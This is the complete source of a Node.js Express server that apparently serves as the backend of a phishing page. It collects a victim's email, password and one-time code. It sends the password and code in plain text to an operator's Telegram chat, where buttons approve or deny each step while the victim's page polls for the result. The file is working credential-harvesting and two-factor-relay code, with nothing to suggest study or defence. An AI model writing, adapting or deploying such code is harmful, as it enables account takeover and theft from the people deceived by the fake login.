const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const app = express();

// Telegram Setup
const token = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.YOUR_CHAT_ID;
const bot = new TelegramBot(token, {polling: true});

// Data Store
const loginAttempts = {};

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// API Endpoints
app.post('/api/login', (req, res) => {
    const { email } = req.body;
    const attemptId = Date.now().toString();
    
    loginAttempts[attemptId] = { 
        email,
        status: 'pending',
        password: null,
        code: null
    };
    
    res.json({ attemptId });
});

app.post('/api/submit-password', (req, res) => {
    const { attemptId, password } = req.body;
    const attempt = loginAttempts[attemptId];
    
    if (!attempt) return res.status(404).json({ error: 'Session expired' });
    
    attempt.password = password;
    
    bot.sendMessage(chatId, 
        `🔐 LOGIN ATTEMPT\n\n📧 Email: ${attempt.email}\n🔑 Password: ${password}\n\n⏰ Time: ${new Date().toLocaleString()}\n\nPlease approve or deny:`, 
        {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ APPROVE', callback_data: `approve_${attemptId}` },
                        { text: '❌ DENY', callback_data: `deny_${attemptId}` }
                    ]
                ]
            }
        }
    );
    
    res.json({ success: true });
});

app.post('/api/verify-otp', (req, res) => {
    const { attemptId, code } = req.body;
    const attempt = loginAttempts[attemptId];
    
    if (!attempt) return res.status(404).json({ error: 'Session expired' });
    
    attempt.code = code;
    attempt.otpStatus = 'pending';
    
    bot.sendMessage(chatId,
        `🔢 OTP VERIFICATION\n\n📧 ${attempt.email}\n🔢 Code: ${code}\n\nIs this OTP correct?`,
        {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Correct', callback_data: `otp_correct_${attemptId}` },
                        { text: '❌ Wrong', callback_data: `otp_wrong_${attemptId}` }
                    ]
                ]
            }
        }
    );
    
    res.json({ success: true });
});

// Telegram Handlers
bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data.split('_');
    const attempt = loginAttempts[data[data.length-1]];
    
    if (attempt) {
        if (data[0] === 'approve' || data[0] === 'deny') {
            attempt.status = data[0];
        } else if (data[1] === 'correct' || data[1] === 'wrong') {
            attempt.otpStatus = data[1];
        }
        
        bot.answerCallbackQuery(callbackQuery.id, {
            text: `Action recorded: ${data[0] || data[1]}`
        });
    }
});

app.get('/api/check-status/:attemptId', (req, res) => {
    const attempt = loginAttempts[req.params.attemptId];
    res.json({ 
        status: attempt?.status || 'pending',
        otpStatus: attempt?.otpStatus || 'pending',
        email: attempt?.email 
    });
});

app.listen(3000, () => console.log('Server running on port 3000'));